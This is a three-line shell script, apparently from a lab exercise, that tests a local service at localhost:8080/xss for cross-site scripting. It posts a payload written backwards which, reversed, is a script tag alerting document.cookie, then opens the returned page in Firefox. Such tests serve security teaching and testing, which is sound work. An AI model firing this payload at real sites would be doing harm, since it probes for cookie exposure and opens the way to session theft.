echo "Realizando un XSS"
curl -X POST -d "string=>tpircs/<;)eikooc.tnemucod(trela>tpIrcs<" localhost:8080/xss > resultado_xss.html
firefox resultado_xss.html
